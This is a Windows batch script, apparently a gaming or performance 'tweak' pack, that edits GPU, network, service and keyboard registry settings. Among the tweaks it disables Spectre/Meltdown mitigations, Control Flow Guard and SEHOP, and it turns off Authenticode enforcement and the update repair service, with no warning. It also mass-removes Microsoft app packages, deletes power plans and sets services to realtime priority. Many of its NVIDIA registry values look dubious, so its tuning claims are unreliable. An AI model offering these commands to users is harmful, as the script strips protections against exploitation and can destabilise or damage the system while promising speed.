reg add "HKLM\SYSTEM\CurrentControlSet\Services\DXGKrnl" /v "DxgkWaitForVerticalBlankEvent" /t REG_DWORD /d "1" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\DXGKrnl" /v "DxgkWaitForVerticalBlankEvent2" /t REG_DWORD /d "1" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\DXGKrnl" /v "SwapChainBackBuffer" /t REG_DWORD /d "1" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\DXGKrnl" /v "TdrResetFromTimeoutAsync" /t REG_DWORD /d "1" /f

cls

:: Monitor Latency Tolerance
reg add "HKLM\SYSTEM\CurrentControlSet\Services\DXGKrnl" /v "MonitorLatencyTolerance" /t REG_DWORD /d "0" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\DXGKrnl" /v "MonitorRefreshLatencyTolerance" /t REG_DWORD /d "0" /f


cls
powershell "Get-AppxPackage *microsoft* | Remove-AppxPackage"
powershell "Get-AppxPackage *xbox* | Remove-AppxPackage"
powershell "Get-AppxPackage -allusers Microsoft.549981C3F5F10 | Remove-AppxPackage"
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management" /v "FeatureSettings" /t REG_DWORD /d "1" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management" /v "FeatureSettingsOverride" /t REG_DWORD /d "3" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management" /v "FeatureSettingsOverrideMask" /t REG_DWORD /d "3" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management" /v "EnableCfg" /t REG_DWORD /d "0" /f
reg add "HKLM\SYSTEM\ControlSet001\Control\Session Manager\Memory Management" /v "FeatureSettings" /t REG_DWORD /d "1" /f
reg add "HKLM\SYSTEM\ControlSet001\Control\Session Manager\Memory Management" /v "FeatureSettingsOverride" /t REG_DWORD /d "3" /f
reg add "HKLM\SYSTEM\ControlSet001\Control\Session Manager\Memory Management" /v "FeatureSettingsOverrideMask" /t REG_DWORD /d "3" /f
reg add "HKLM\SYSTEM\ControlSet001\Control\Session Manager\Memory Management" /v "EnableCfg" /t REG_DWORD /d "0" /f
reg add "HKLM\SYSTEM\ControlSet002\Control\Session Manager\Memory Management" /v "FeatureSettings" /t REG_DWORD /d "1" /f
reg add "HKLM\SYSTEM\ControlSet002\Control\Session Manager\Memory Management" /v "FeatureSettingsOverride" /t REG_DWORD /d "3" /f
reg add "HKLM\SYSTEM\ControlSet002\Control\Session Manager\Memory Management" /v "FeatureSettingsOverrideMask" /t REG_DWORD /d "3" /f
cls
reg add "HKLM\SYSTEM\ControlSet002\Control\Session Manager\Memory Management" /v "EnableCfg" /t REG_DWORD /d "0" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\kernel" /v "DisableExceptionChainValidation" /t REG_DWORD /d "1" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\kernel" /v "KernelSEHOPEnabled" /t REG_DWORD /d "0" /f
reg add "HKLM\SYSTEM\ControlSet001\Control\Session Manager\kernel" /v "DisableExceptionChainValidation" /t REG_DWORD /d "1" /f
reg add "HKLM\SYSTEM\ControlSet001\Control\Session Manager\kernel" /v "KernelSEHOPEnabled" /t REG_DWORD /d "0" /f
reg add "HKLM\SYSTEM\ControlSet002\Control\Session Manager\kernel" /v "DisableExceptionChainValidation" /t REG_DWORD /d "1" /f
reg add "HKLM\SYSTEM\ControlSet002\Control\Session Manager\kernel" /v "KernelSEHOPEnabled" /t REG_DWORD /d "0" /f
reg add "HKCU\Control Panel\International\User Profile" /v "HttpAcceptLanguageOptOut" /t REG_DWORD /d "1" /f >nul 2>&1
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\AdvertisingInfo" /v "Enabled" /t REG_DWORD /d "0" /f >nul 2>&1
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\AppHost" /v "EnableWebContentEvaluation" /t REG_DWORD /d "0" /f >nul 2>&1
reg add "HKLM\Software\Microsoft\PolicyManager\default\WiFi\AllowAutoConnectToWiFiSenseHotspots" /v "value" /t REG_DWORD /d "0" /f >nul 2>&1
reg add "HKLM\Software\Microsoft\PolicyManager\default\WiFi\AllowWiFiHotSpotReporting" /v "value" /t REG_DWORD /d "0" /f >nul 2>&1
reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\DeliveryOptimization\Config" /v "DownloadMode" /t REG_DWORD /d "0" /f >nul 2>&1
reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\ImmersiveShell" /v "UseActionCenterExperience" /t REG_DWORD /d "0" /f >nul 2>&1
cls
reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\DataCollection" /v "AllowTelemetry" /t REG_DWORD /d "0" /f >nul 2>&1
reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v "HideSCAHealth" /t REG_DWORD /d "1" /f >nul 2>&1
reg add "HKLM\Software\Policies\Microsoft\Windows\AdvertisingInfo" /v "DisabledByGroupPolicy" /t REG_DWORD /d "1" /f >nul 2>&1
reg add "HKLM\Software\Policies\Microsoft\Windows\DataCollection" /v "AllowTelemetry" /t REG_DWORD /d "0" /f >nul 2>&1
reg add "HKLM\Software\Policies\Microsoft\Windows\EnhancedStorageDevices" /v "TCGSecurityActivationDisabled" /t REG_DWORD /d "0" /f >nul 2>&1
reg add "HKLM\Software\Policies\Microsoft\Windows\OneDrive" /v "DisableFileSyncNGSC" /t REG_DWORD /d "1" /f >nul 2>&1
reg add "HKLM\Software\Policies\Microsoft\Windows\safer\codeidentifiers" /v "authenticodeenabled" /t REG_DWORD /d "0" /f >nul 2>&1
reg add "HKLM\Software\Policies\Microsoft\Windows\Windows Error Reporting" /v "DontSendAdditionalData" /t REG_DWORD /d "1" /f >nul 2>&1
cls
reg add "HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Policies\DataCollection" /v "AllowTelemetry" /t REG_DWORD /d "0" /f >nul 2>&1
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Games" /v "Affinity" /t REG_DWORD /d "0" /f
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Games" /v "Background Only" /t REG_SZ /d "False" /f
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Games" /v "Clock Rate" /t REG_DWORD /d "10000" /f
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Games" /v "GPU Priority" /t REG_DWORD /d "8" /f
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Games" /v "Priority" /t REG_DWORD /d "6" /f
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Games" /v "Scheduling Category" /t REG_SZ /d "High" /f
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Games" /v "SFIO Priority" /t REG_SZ /d "High" /f
powercfg -delete 381b4222-f694-41f0-9685-ff5bb260df2e
powercfg -delete 8c5e7fda-e8bf-4a96-9a85-a6e23a8c635c
powercfg -delete a1841308-3541-4fab-bc81-f71556f20b4a

:nvidia_tweaks
cls
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\nvlddmkm" /v "RmGpsPsEnablePerCpuCoreDpc" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\nvlddmkm\NVAPI" /v "RmGpsPsEnablePerCpuCoreDpc" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\nvlddmkm\Global\NVTweak" /v "RmGpsPsEnablePerCpuCoreDpc" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\nvlddmkm" /v "RmDistRenderMax" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\nvlddmkm" /v "RMEnableHdmi2" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\nvlddmkm" /v "RMEnableOveclockingAllPstates" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\nvlddmkm" /v "DisableOverclockedPstates" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\nvlddmkm" /v "RMForceLockedClocksMode" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\nvlddmkm" /v "RMEnableClk" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\nvlddmkm" /v "EnablePerformanceMode" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\nvlddmkm" /v "RMMaximizePteTableSize" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\nvlddmkm" /v "UseUncachedPCIMappings" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\nvlddmkm" /v "RMEnableVmm" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\nvlddmkm" /v "RMGpuCacheEnable" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\nvlddmkm" /v "DisableAsyncPstates" /t REG_DWORD /d "1" /f
cls
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\nvlddmkm" /v "EnableForceIgpuDgpuFromUI" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\nvlddmkm" /v "EnableCoreVoltage" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\nvlddmkm" /v "RmGpuDirectP2p" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\nvlddmkm" /v "RmTCCControl" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\nvlddmkm" /v "EnableDeepSleep" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\nvlddmkm" /v "EnableDeepSleepTx" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\nvlddmkm" /v "EnableDmaRemapping" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\nvlddmkm" /v "EnableEnhanceRefreshRate" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\nvlddmkm" /v "DisableFifoRetraining" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\nvlddmkm" /v "EnableMemoryLowPowerMode" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\nvlddmkm" /v "EnablePciGen3" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\nvlddmkm" /v "EnableVideoPLLShutdown" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\nvlddmkm" /v "RmLocksGranularity" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\nvlddmkm" /v "EnableAICCoreTempMonitor" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\nvlddmkm" /v "DisablePWRThrottling" /t REG_DWORD /d "0" /f
cls

REM Scan and repair system files
echo Scanning and repairing system files...
sfc /scannow
echo.

cls




cls


for /f %%r in ('Reg query "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\Interfaces" /f "1" /d /s^|Findstr HKEY_') do (
Reg add %%r /v "NonBestEffortLimit" /t Reg_DWORD /d "0" /f 
Reg add %%r /v "DeadGWDetectDefault" /t Reg_DWORD /d "1" /f 
Reg add %%r /v "PerformRouterDiscovery" /t Reg_DWORD /d "1" /f
Reg add %%r /v "TCPNoDelay" /t Reg_DWORD /d "1" /f
Reg add %%r /v "TcpAckFrequency" /t Reg_DWORD /d "1" /f
Reg add %%r /v "TcpInitialRTT" /t Reg_DWORD /d "2" /f
Reg add %%r /v "TcpDelAckTicks" /t Reg_DWORD /d "0" /f
Reg add %%r /v "MTU" /t Reg_DWORD /d "1500" /f
Reg add %%r /v "UseZeroBroadcast" /t Reg_DWORD /d "0" /f
)
cls
for /f %%a in ('Reg query HKLM /v "*WakeOnMagicPacket" /s ^| findstr  "HKEY"') do (
for /f %%i in ('Reg query "%%a" /v "*EEE" ^| findstr "HKEY"') do (Reg add "%%i" /v "*EEE" /t Reg_DWORD /d "0" /f)
for /f %%i in ('Reg query "%%a" /v "*FlowControl" ^| findstr "HKEY"') do (Reg add "%%i" /v "*FlowControl" /t Reg_DWORD /d "0" /f)
for /f %%i in ('Reg query "%%a" /v "EnableSavePowerNow" ^| findstr "HKEY"') do (Reg add "%%i" /v "EnableSavePowerNow" /t Reg_SZ /d "0" /f)
for /f %%i in ('Reg query "%%a" /v "EnablePowerManagement" ^| findstr "HKEY"') do (Reg add "%%i" /v "EnablePowerManagement" /t Reg_SZ /d "0" /f)
for /f %%i in ('Reg query "%%a" /v "EnableDynamicPowerGating" ^| findstr "HKEY"') do (Reg add "%%i" /v "EnableDynamicPowerGating" /t Reg_SZ /d "0" /f)
for /f %%i in ('Reg query "%%a" /v "EnableConnectedPowerGating" ^| findstr "HKEY"') do (Reg add "%%i" /v "EnableConnectedPowerGating" /t Reg_SZ /d "0" /f)
for /f %%i in ('Reg query "%%a" /v "AutoPowerSaveModeEnabled" ^| findstr "HKEY"') do (Reg add "%%i" /v "AutoPowerSaveModeEnabled" /t Reg_SZ /d "0" /f)
for /f %%i in ('Reg query "%%a" /v "AdvancedEEE" ^| findstr "HKEY"') do (Reg add "%%i" /v "AdvancedEEE" /t Reg_DWORD /d "0" /f)
for /f %%i in ('Reg query "%%a" /v "ULPMode" ^| findstr "HKEY"') do (Reg add "%%i" /v "ULPMode" /t Reg_SZ /d "0" /f)
for /f %%i in ('Reg query "%%a" /v "ReduceSpeedOnPowerDown" ^| findstr "HKEY"') do (Reg add "%%i" /v "ReduceSpeedOnPowerDown" /t Reg_SZ /d "0" /f)
for /f %%i in ('Reg query "%%a" /v "EnablePME" ^| findstr "HKEY"') do (Reg add "%%i" /v "EnablePME" /t Reg_SZ /d "0" /f)
for /f %%i in ('Reg query "%%a" /v "*WakeOnMagicPacket" ^| findstr "HKEY"') do (Reg add "%%i" /v "*WakeOnMagicPacket" /t Reg_SZ /d "0" /f)
for /f %%i in ('Reg query "%%a" /v "*WakeOnPattern" ^| findstr "HKEY"') do (Reg add "%%i" /v "*WakeOnPattern" /t Reg_SZ /d "0" /f)
for /f %%i in ('Reg query "%%a" /v "*TCPChecksumOffloadIPv4" ^| findstr "HKEY"') do (Reg add "%%i" /v "*TCPChecksumOffloadIPv4" /t Reg_SZ /d "1" /f)
cls
for /f %%i in ('Reg query "%%a" /v "*TCPChecksumOffloadIPv6" ^| findstr "HKEY"') do (Reg add "%%i" /v "*TCPChecksumOffloadIPv6" /t Reg_SZ /d "1" /f)
for /f %%i in ('Reg query "%%a" /v "*UDPChecksumOffloadIPv4" ^| findstr "HKEY"') do (Reg add "%%i" /v "*UDPChecksumOffloadIPv4" /t Reg_SZ /d "1" /f)
for /f %%i in ('Reg query "%%a" /v "*UDPChecksumOffloadIPv6" ^| findstr "HKEY"') do (Reg add "%%i" /v "*UDPChecksumOffloadIPv6" /t Reg_SZ /d "1" /f)
for /f %%i in ('Reg query "%%a" /v "WolShutdownLinkSpeed" ^| findstr "HKEY"') do (Reg add "%%i" /v "WolShutdownLinkSpeed" /t Reg_SZ /d "2" /f)
for /f %%i in ('Reg query "%%a" /v "*SpeedDuplex" ^| findstr "HKEY"') do (Reg add "%%i" /v "*SpeedDuplex" /t Reg_SZ /d "6" /f)
for /f %%i in ('Reg query "%%a" /v "*LsoV2IPv4" ^| findstr "HKEY"') do (Reg add "%%i" /v "*LsoV2IPv4" /t Reg_SZ /d "0" /f)
for /f %%i in ('Reg query "%%a" /v "*LsoV2IPv6" ^| findstr "HKEY"') do (Reg add "%%i" /v "*LsoV2IPv6" /t Reg_SZ /d "0" /f)
for /f %%i in ('Reg query "%%a" /v "*TransmitBuffers" ^| findstr "HKEY"') do (Reg add "%%i" /v "*TransmitBuffers" /t Reg_SZ /d "128" /f)
for /f %%i in ('Reg query "%%a" /v "*ReceiveBuffers" ^| findstr "HKEY"') do (Reg add "%%i" /v "*ReceiveBuffers" /t Reg_SZ /d "512" /f)
cls
for /f %%i in ('Reg query "%%a" /v "*JumboPacket" ^| findstr "HKEY"') do (Reg add "%%i" /v "*JumboPacket" /t Reg_SZ /d "9014" /f)
for /f %%i in ('Reg query "%%a" /v "*PMARPOffload" ^| findstr "HKEY"') do (Reg add "%%i" /v "*PMARPOffload" /t Reg_SZ /d "1" /f)
for /f %%i in ('Reg query "%%a" /v "*PMNSOffload" ^| findstr "HKEY"') do (Reg add "%%i" /v "*PMNSOffload" /t Reg_SZ /d "0" /f)
for /f %%i in ('Reg query "%%a" /v "*InterruptModeration" ^| findstr "HKEY"') do (Reg add "%%i" /v "*InterruptModeration" /t Reg_SZ /d "0" /f)
for /f %%i in ('Reg query "%%a" /v "*ModernStandbyWoLMagicPacket" ^| findstr "HKEY"') do (Reg add "%%i" /v "*ModernStandbyWoLMagicPacket" /t Reg_SZ /d "0" /f)
for /f %%i in ('Reg query "%%a" /v "WakeOnLinkChange" ^| findstr "HKEY"') do (Reg add "%%i" /v "WakeOnLinkChange" /t Reg_SZ /d "0" /f)
for /f %%i in ('Reg query "%%a" /v "*IPChecksumOffloadIPv4" ^| findstr "HKEY"') do (Reg add "%%i" /v "*IPChecksumOffloadIPv4" /t Reg_SZ /d "3" /f)
for /f %%i in ('Reg query "%%a" /v "*RSS" ^| findstr "HKEY"') do (Reg add "%%i" /v "*RSS" /t Reg_SZ /d "1" /f)
for /f %%i in ('Reg query "%%a" /v "*NumRssQueues" ^| findstr "HKEY"') do (Reg add "%%i" /v "*NumRssQueues" /t Reg_SZ /d "4" /f)
for /f %%i in ('Reg query "%%a" /v "EnableGreenEthernet" ^| findstr "HKEY"') do (Reg add "%%i" /v "EnableGreenEthernet" /t Reg_SZ /d "0" /f)
for /f %%i in ('Reg query "%%a" /v "GigaLite" ^| findstr "HKEY"') do (Reg add "%%i" /v "GigaLite" /t Reg_SZ /d "0" /f)
for /f %%i in ('Reg query "%%a" /v "PowerSavingMode" ^| findstr "HKEY"') do (Reg add "%%i" /v "PowerSavingMode" /t Reg_SZ /d "0" /f)
for /f %%i in ('Reg query "%%a" /v "S5WakeOnLan" ^| findstr "HKEY"') do (Reg add "%%i" /v "S5WakeOnLan" /t Reg_SZ /d "0" /f)
for /f %%i in ('Reg query "%%a" /v "AutoDisableGigabit" ^| findstr "HKEY"') do (Reg add "%%i" /v "AutoDisableGigabit" /t Reg_SZ /d "0" /f)
)

cls
for /f "tokens=3" %%a in ('sc queryex "DsSvc" ^| findstr "PID"') do (set pid=%%a)
wmic process where ProcessId=%pid% CALL setpriority "realtime"
sc start Dhcp
for /f "tokens=3" %%a in ('sc queryex "Dhcp" ^| findstr "PID"') do (set pid=%%a)
wmic process where ProcessId=%pid% CALL setpriority "realtime"
sc start DPS 
for /f "tokens=3" %%a in ('sc queryex "DPS" ^| findstr "PID"') do (set pid=%%a)
wmic process where ProcessId=%pid% CALL setpriority "realtime"
sc start Dnscache
for /f "tokens=3" %%a in ('sc queryex "Dnscache" ^| findstr "PID"') do (set pid=%%a)
wmic process where ProcessId=%pid% CALL setpriority "realtime"
sc start WinHttpAutoProxySvc
for /f "tokens=3" %%a in ('sc queryex "WinHttpAutoProxySvc" ^| findstr "PID"') do (set pid=%%a)
wmic process where ProcessId=%pid% CALL setpriority "realtime"
sc start DcpSvc
cls
for /f "tokens=3" %%a in ('sc queryex "WlanSvc" ^| findstr "PID"') do (set pid=%%a)
wmic process where ProcessId=%pid% CALL setpriority "realtime"
sc start LSM
for /f "tokens=3" %%a in ('sc queryex "LSM" ^| findstr "PID"') do (set pid=%%a)
wmic process where ProcessId=%pid% CALL setpriority "realtime"
sc start smphost
for /f "tokens=3" %%a in ('sc queryex "smphost" ^| findstr "PID"') do (set pid=%%a)
wmic process where ProcessId=%pid% CALL setpriority "low"
sc start PNRPsvc
for /f "tokens=3" %%a in ('sc queryex "PNRPsvc" ^| findstr "PID"') do (set pid=%%a)
wmic process where ProcessId=%pid% CALL setpriority "low"
sc start SensrSvc
for /f "tokens=3" %%a in ('sc queryex "SensrSvc" ^| findstr "PID"') do (set pid=%%a)
wmic process where ProcessId=%pid% CALL setpriority "low"
sc start Wcmsvc
for /f "tokens=3" %%a in ('sc queryex "Wcmsvc" ^| findstr "PID"') do (set pid=%%a)
wmic process where ProcessId=%pid% CALL setpriority "low"
sc start Wersvc
for /f "tokens=3" %%a in ('sc queryex "Wersvc" ^| findstr "PID"') do (set pid=%%a)
wmic process where ProcessId=%pid% CALL setpriority "low"
sc start Spooler
for /f "tokens=3" %%a in ('sc queryex "Spooler" ^| findstr "PID"') do (set pid=%%a)
wmic process where ProcessId=%pid% CALL setpriority "realtime"
sc start vds
for /f "tokens=3" %%a in ('sc queryex "vds" ^| findstr "PID"') do (set pid=%%a)
wmic process where ProcessId=%pid% CALL setpriority "realtime"
cls
Reg.exe add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\xbgm" /v "Start" /t REG_DWORD /d "4" /f >nul 2>&1
Reg.exe add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\XboxGipSvc" /v "Start" /t REG_DWORD /d "4" /f >nul 2>&1
Reg.exe add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\WaaSMedicSvc" /v "Start" /t REG_DWORD /d "4" /f >nul 2>&1
Reg.exe add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\W32Time" /v "Start" /t REG_DWORD /d "4" /f >nul 2>&1
Reg.exe add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\spectrum" /v "Start" /t REG_DWORD /d "4" /f >nul 2>&1
Reg.exe add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\wcncsvc" /v "Start" /t REG_DWORD /d "4" /f >nul 2>&1
Reg.exe add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\WebClient" /v "Start" /t REG_DWORD /d "4" /f >nul 2>&1
Reg.exe add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\SysMain" /v "Start" /t REG_DWORD /d "4" /f >nul 2>&1
Reg.exe add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\NcaSvc" /v "Start" /t REG_DWORD /d "4" /f >nul 2>&1
Reg.exe add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\diagsvc" /v "Start" /t REG_DWORD /d "4" /f >nul 2>&1
Reg.exe add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\UserDataSvc" /v "Start" /t REG_DWORD /d "4" /f >nul 2>&1
Reg.exe add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\stisvc" /v "Start" /t REG_DWORD /d "4" /f >nul 2>&1
Reg.exe add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\AdobeFlashPlayerUpdateSvc" /v "Start" /t REG_DWORD /d "4" /f >nul 2>&1 
Reg.exe add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\TrkWks" /v "Start" /t REG_DWORD /d "4" /f  >nul 2>&1
Reg.exe add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\dmwappushservice" /v "Start" /t REG_DWORD /d "4" /f >nul 2>&1  
Reg.exe add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\PimIndexMaintenanceSvc" /v "Start" /t REG_DWORD /d "4" /f >nul 2>&1
Reg.exe add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\DiagTrack" /v "Start" /t REG_DWORD /d "4" /f >nul 2>&1
Reg.exe add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\GoogleChromeElevationService" /v "Start" /t REG_DWORD /d "4" /f >nul 2>&1
Reg.exe add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\OneSyncSvc" /v "Start" /t REG_DWORD /d "4" /f >nul 2>&1
Reg.exe add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\ibtsiva" /v "Start" /t REG_DWORD /d "4" /f >nul 2>&1
Reg.exe add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\SNMPTRAP" /v "Start" /t REG_DWORD /d "4" /f >nul 2>&1
Reg.exe add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\pla" /v "Start" /t REG_DWORD /d "4" /f >nul 2>&1
Reg.exe add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\ssh-agent" /v "Start" /t REG_DWORD /d "4" /f >nul 2>&1
Reg.exe add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\sshd" /v "Start" /t REG_DWORD /d "4" /f >nul 2>&1
Reg.exe add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\DoSvc" /v "Start" /t REG_DWORD /d "4" /f >nul 2>&1
cls
Reg.exe add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\PcaSvc" /v "Start" /t REG_DWORD /d "4" /f >nul 2>&1
Reg.exe add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\NetTcpPortSharing" /v "Start" /t REG_DWORD /d "4" /f >nul 2>&1
Reg.exe add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\wersvc" /v "Start" /t REG_DWORD /d "4" /f >nul 2>&1
Reg.exe add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\gupdate" /v "Start" /t REG_DWORD /d "4" /f >nul 2>&1
Reg.exe add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\gupdatem" /v "Start" /t REG_DWORD /d "4" /f >nul 2>&1
Reg.exe add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\MSiSCSI" /v "Start" /t REG_DWORD /d "4" /f >nul 2>&1
Reg.exe add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\WMPNetworkSvc" /v "Start" /t REG_DWORD /d "4" /f >nul 2>&1
Reg.exe add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\CDPUserSvc" /v "Start" /t REG_DWORD /d "4" /f >nul 2>&1
cls
Reg.exe add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\MapsBroker" /v "Start" /t REG_DWORD /d "4" /f >nul 2>&1
Reg.exe add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\debugregsvc" /v "Start" /t REG_DWORD /d "4" /f >nul 2>&1
Reg.exe add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Ndu" /v "Start" /d "2" /t REG_DWORD /f >nul 2>&1
Reg.exe add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\TimeBrokerSvc" /v "Start" /d "3" /t REG_DWORD /f >nul 2>&1
Reg.exe add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\VaultSvc" /v "Start" /t REG_DWORD /d "3" /f >nul 2>&1
Reg.exe add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\wuauserv" /v "Start" /t REG_DWORD /d "3" /f >nul 2>&1

echo.
Reg.exe add "HKCU\Control Panel\Accessibility\Keyboard Response" /v "AutoRepeatDelay" /t REG_SZ /d "200" /f
Reg.exe add "HKCU\Control Panel\Accessibility\Keyboard Response" /v "AutoRepeatRate" /t REG_SZ /d "6" /f
Reg.exe add "HKCU\Control Panel\Accessibility\Keyboard Response" /v "BounceTime" /t REG_SZ /d "0" /f
Reg.exe add "HKCU\Control Panel\Accessibility\Keyboard Response" /v "DelayBeforeAcceptance" /t REG_SZ /d "0" /f
Reg.exe add "HKCU\Control Panel\Accessibility\Keyboard Response" /v "Flags" /t REG_SZ /d "59" /f
Reg.exe add "HKCU\Control Panel\Accessibility\Keyboard Response" /v "Last BounceKey Setting" /t REG_DWORD /d "0" /f
Reg.exe add "HKCU\Control Panel\Accessibility\Keyboard Response" /v "Last Valid Delay" /t REG_DWORD /d "0" /f
Reg.exe add "HKCU\Control Panel\Accessibility\Keyboard Response" /v "Last Valid Repeat" /t REG_DWORD /d "0" /f
Reg.exe add "HKCU\Control Panel\Accessibility\Keyboard Response" /v "Last Valid Wait" /t REG_DWORD /d "1000" /f
Reg.exe add "HKCU\Control Panel\Accessibility\StickyKeys" /v "Flags" /t REG_SZ /d "506" /f
Reg.exe add "HKCU\Control Panel\Accessibility\ToggleKeys" /v "Flags" /t REG_SZ /d "58" /f
Reg.exe add "HKCU\Control Panel\Accessibility\MouseKeys" /v "Flags" /t REG_SZ /d "38" /f
Reg.exe add "HKCU\Control Panel\Keyboard" /v "InitialKeyboardIndicators" /t REG_SZ /d "0" /f
